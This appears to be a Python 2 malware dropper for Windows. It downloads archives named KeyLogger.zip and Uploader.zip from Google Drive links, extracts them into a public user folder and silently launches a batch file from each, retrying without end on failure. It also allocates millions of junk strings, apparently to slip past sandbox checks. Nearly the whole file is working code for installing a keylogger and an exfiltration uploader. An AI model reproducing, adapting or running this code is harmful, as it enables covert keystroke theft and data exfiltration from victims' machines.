from urllib2 import urlopen
from time import sleep
from zipfile import ZipFile
from shutil import rmtree
from os import system
from os import getenv
from os import path
from os import makedirs
from os import remove
from sys import exit
import os 
import ftplib
import random

def download(link,name):
	print 'downloading -> '+ name
	import urllib2
	url = link
	if link.startswith('done'):
		return
	else:	

		req = urlopen(url)
		CHUNK = 16 * 1024
		with open(name, 'wb') as fp:
		  while True:
			chunk = req.read(CHUNK)
			if not chunk: break
			fp.write(chunk)
	try:		
		Extractor(name)
	except Exception as e:
		print e
		sleep(10)
		download(link,name)

def Extractor(name):
	print 'Extracting -> '+name
	fh = open(name, 'rb')
	z = ZipFile(fh)
	val1=''.join(map(str,name.split('\\')[-1]))[:-4]
	if path.isdir("C:\\Users\\Public\\Local\\"+val1):
		rmtree("C:\\Users\\Public\\Local\\"+val1, ignore_errors=True)	
		
	for name in z.namelist():
		outpath = "C:\\Users\\Public\\Local\\"+val1
		z.extract(name, outpath)
	fh.close()

	sleep(3)	
	system("start /min C:\\Users\\Public\\Local\\"+val1+"\\Copyright@2018\\readme.bat & exit")
	return

def start1():
	fullfilename = path.join('C:\\Users\\Public\\Local', 'KeyLogger.zip')	
	try:
		download("https://drive.google.com/uc?export=download&id=1WYX8VqnSQjAOfpiCL3jAtUY91IYuJpXF",fullfilename)
	except Exception as e: 
		sleep(5)

		start1()

def start2():
	fullfilename = path.join('C:\\Users\\Public\\Local', 'Uploader.zip')	
	try:
		download("https://drive.google.com/uc?export=download&id=1DyOZErXaFZT_w4iE6vhMxv4AcN9-g543",fullfilename)
	except Exception as e: 

		sleep(5)
		start2()


				
path1 = getenv("LOCALAPPDATA")#Specify your FTP Server address
val='\\'.join(map(str,  path1.split("\\")[:-2])) 
if 	path.isdir("C:\\Users\\Public\\Local"):
	rmtree("C:\\Users\\Public\\Local", ignore_errors=True)
try:	
	makedirs("C:\\Users\\Public\\Local")
except:
	exit()	



def doAllocate(size):
    result=size*[None]
    count=0
    for i in range(size):

        message= str(random.randint(1,100))+"some unique object %d" % ( i, )

        result[i]= message

    return result


doAllocate(2621440)
print("Allocated")
	
start1()
start2()